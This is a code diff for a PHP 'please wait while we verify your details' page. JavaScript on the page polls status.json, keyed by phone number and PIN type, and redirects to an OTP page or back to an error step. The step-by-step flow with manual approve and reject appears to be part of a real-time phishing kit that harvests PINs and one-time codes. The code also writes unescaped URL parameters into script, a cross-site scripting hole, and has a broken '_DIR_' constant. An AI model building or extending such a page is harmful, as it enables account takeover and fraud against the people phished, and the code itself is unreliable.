@@ -1,31 +1,39 @@
 <?php
-session_start();
+$phone = $_GET['phone'] ?? '';
+$type  = $_GET['type'] ?? 'pin';
+$file  = _DIR_ . "/status.json";
 
-// Get session ID from URL
-$id = $_GET['id'];
-
-// Check status stored in PHP session (no DB)
-if(isset($_SESSION['status'][$id])) {
-    if($_SESSION['status'][$id] == 'approved') {
-        header("Location: otp.php");
-        exit();
-    } elseif($_SESSION['status'][$id] == 'rejected') {
-        header("Location: step3.php?error=1");
-        exit();
-    }
-}
+// Poll every 2 seconds via JavaScript
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-<title>Processing...</title>
-<meta http-equiv="refresh" content="5">
-<link rel="stylesheet" href="style.css">
+<title>Waiting...</title>
+<script>
+function checkStatus() {
+    fetch('status.json')
+        .then(response => response.json())
+        .then(data => {
+            const phone = "<?php echo $phone; ?>";
+            const type = "<?php echo $type; ?>";
+            if(data[phone] && data[phone][type]) {
+                const status = data[phone][type];
+                if(status === 'approve') {
+                    window.location.href = "otp.php?phone=" + phone;
+                } else if(status === 'reject') {
+                    window.location.href = "step3.php?phone=" + phone + "&error=1";
+                }
+            }
+        })
+        .catch(err => console.log(err));
+}
+
+// Check every 2 seconds
+setInterval(checkStatus, 2000);
+</script>
 </head>
 <body>
-<div class="box">
-    <h2>Please wait while we verify your details...</h2>
-    <p>Verifying</p>
-</div>
+<h2>Please wait while we verify your details...</h2>
+<p>Verifying...</p>
 </body>
 </html>
